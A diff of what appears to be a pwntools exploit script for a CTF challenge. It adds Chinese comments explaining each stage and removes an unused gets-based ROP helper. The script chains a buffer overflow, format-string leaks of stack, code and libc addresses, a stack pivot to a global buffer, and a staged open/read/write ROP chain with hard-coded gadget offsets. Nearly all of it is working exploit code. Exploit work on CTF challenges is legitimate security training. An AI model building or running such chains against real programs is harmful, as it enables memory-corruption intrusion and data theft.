@@ -12,12 +12,15 @@ r = remote("edu-ctf.zoolab.org", 30206)
 
 
 # cnt 
+# 這邊local 往上塞就可以達到cnt了
 def buffer_overflow_cnt():
     r.sendlineafter("local > ",b'local')
     r.sendlineafter("write > ",b'read')
     r.sendlineafter("length > ",b'60') 
     r.send(b"A"*0x24 + p64(0x100))
 
+# 因為第一個的%p會是rsi, 而這個時候因為剛做了 strncmp ("write",local,5)
+# 所以 rsi會有local的位置,這樣就可以leak stack的位置
 def leakStackBaseAddress():
     r.sendlineafter("local > ",b'global')
     r.sendlineafter("write > ",b'read')
@@ -37,6 +40,8 @@ def leakStackBaseAddress():
     # print("code_base_address",hex(code_base_address))
     return local_buffer_address
 
+# 因為 7$ 會是 rsp + 8,並且這個位置是 mywrite的參數addr的位置,所以我們addr放入global
+# 在leak出來 就可以得到code的address
 def leakCodeBaseAddress():
     r.sendlineafter("local > ",b'global')
     r.sendlineafter("write > ",b'read')
@@ -72,6 +77,8 @@ def leakglobal_bufferAddress():
     return global_buffer_address
 
 
+# 用rop chain ,Puts 把puts他自己的位置印出來,因為puts.plt , puts.got是我們有了code base address
+# 之後就可以知道的東西 ,所以可以成功leak 出libc
 def leakLibC(code_base_address):
 
 
@@ -108,52 +115,6 @@ def leakLibC(code_base_address):
     r.send(b"A"*0x24 + p64(0x100))
     return libc_address
 
-def callGets(code_base_address,libc_address,open_read_write_ROP_stack):
-    # local_stack_address = leakStackBaseAddress()
-    print("open_read_write_ROP_stack",hex(open_read_write_ROP_stack))
-
-
-    pop_rdi_ret = 0x16d3 + code_base_address
-    gets = 0x86af0 + libc_address
-    chal= 0x146a + code_base_address
-    pop_rsi_ret = 0x27529 + libc_address 
-    pop_rdx_pop_rbx_ret = 0x162866   + libc_address
-    pop_rax_ret = 0x4a550  + libc_address
-    scanf = 0x1184 + code_base_address
-    ret = 0x101a  + code_base_address
-    print("scanf",hex(scanf))
-
-    print("get address",hex(gets))
-
-    #  pop_rdi_ret,3,
-    #     pop_rsi_ret,fn,
-    #     pop_rdx_ret,0x30,
-    #     pop_rax_ret,0,
-    #     syscall_ret,
-
-    global_buffer_address = leakglobal_bufferAddress()
-    # print("pop_rdi_ret",hex(pop_rdi_ret),"global_buffer_address",hex(global_buffer_address),"gets",hex(gets),"chal",hex(chal))
-    print("pop_rdi_ret",hex(pop_rdi_ret),"open_read_write_ROP_stack",hex(open_read_write_ROP_stack),"gets",hex(gets),"chal",hex(chal))
-
-
-    padding = b'A'*0x24 + b'\x00'*4+ b'A'*0x10
-    rop = padding + flat(
-        # pop_rdi_ret,open_read_write_ROP_stack,
-        pop_rdi_ret,global_buffer_address,
-        gets,
-        chal
-    )
-    # print("rop",rop)
-    print("len of padding",len(rop))
-    r.sendlineafter("local > ",b'local')
-    r.sendlineafter("write > ",b'read')
-    r.sendlineafter("length > ",str(len(rop)+3).encode())
-    r.sendline(rop)
-    
-
-    r.sendline('ffffff')
-   
-    return libc_address
 
 
 
@@ -191,6 +152,7 @@ ret = 0x101a  + code_base_address
 leave_ret = code_base_address + 0x00000000000013dc
 
 padding = b'A'*0x24+ p32(1) + b'A'*0x8
+# 因為buffer overflow 長度不夠我們寫read的rop chain所以使用stack pivot 來轉移到global 
 stack_pivot_rop = padding + flat(
     # pop_rdi_ret,open_read_write_ROP_stack,
     global_buffer_address,
@@ -213,6 +175,9 @@ pop_rdx_pop_rbx_ret = libc_address + 0x0000000000162866
 
 open_read_write_ROP_addr = global_buffer_address + 0x48
 
+
+# 這邊ROP chain 先call 一個read出來, 因為0x60還是不夠我們寫open_read_write的ROP chain 
+# 所以先call 一個 read把真正要執行的ROP chain read 近來
 read_ROP = flat(
     0xdeadbeef,
     pop_rdi_ret , 0,
@@ -227,6 +192,7 @@ open = libc_address + 0x0000000000110e50
 write = libc_address + 0x00000000001111d0
 shall_string_address = global_buffer_address + 0xf8
 syscall_ret = libc_address + 0x0000000000066229
+# open_read_write_rop chain
 ROP = flat(
     pop_rdi_ret, shall_string_address,
     pop_rsi_ret, 0,
